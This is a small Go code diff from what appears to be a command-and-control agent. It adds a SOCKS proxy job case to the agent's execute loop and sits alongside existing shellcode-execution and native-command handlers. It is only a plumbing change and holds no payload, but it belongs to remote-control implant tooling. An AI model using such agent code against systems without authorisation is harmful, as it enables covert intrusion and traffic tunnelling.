@@ -305,7 +305,7 @@ func (s *Service) Handle(Jobs []jobs.Job) {
 			case jobs.RESULT:
 				out <- job
 			case jobs.SOCKS:
-				socks.Handler(job, &out)
+				socks.Handler(job, &out, &in)
 			default:
 				var result jobs.Results
 				result.Stderr = fmt.Sprintf("%s is not a valid job type", job.Type)
@@ -397,6 +397,9 @@ func execute() {
 				result = commands.Native(job.Payload.(jobs.Command))
 			case jobs.SHELLCODE:
 				result = commands.ExecuteShellcode(job.Payload.(jobs.Shellcode))
+			case jobs.SOCKS:
+				socks.Handler(job, &out, &in)
+				return
 			default:
 				result.Stderr = fmt.Sprintf("Invalid job type: %d", job.Type)
 			}
